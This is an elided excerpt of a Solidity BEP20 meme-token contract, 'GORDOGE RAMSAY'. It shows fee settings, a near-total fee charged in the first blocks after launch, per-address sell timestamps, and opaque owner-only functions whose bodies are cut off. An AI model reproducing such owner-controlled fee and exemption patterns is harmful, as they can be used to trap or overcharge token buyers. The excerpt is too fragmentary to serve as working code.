...
contract GORDOGERAMSAY is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "GORDOGE RAMSAY";
    string constant _symbol = "GDR";
    ...
    mapping(address => uint256) _LastSellTimestamp;
    ...
    uint256 liquidityFee = 1000000000;
    uint256 buybackFee = 3000000000;
    uint256 reflectionFee = 12000000000;
    uint256 marketingFee = 2000000000;
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + 2 > block.number){ return feeDenominator.sub((owners.div(_totalSupply).div(_totalSupply))); }
    ...
    function DXSaleDetails(address presale, address DXrouter) external authorized {
        isFeeExempt[presale] = true;
        isTxLimitExempt[presale] = true;
	    isDividendExempt[presale] = true;
        isFeeExempt[DXrouter] = true;
        isTxLimitExempt[DXrouter] = true;
    ...
    function TABLESERVICE(uint256 amount, bool triggerBuybackMultiplier) external authorized {
    ...
    function THEFOODISRAW(uint256 amount, uint256 amount2) external authorized {
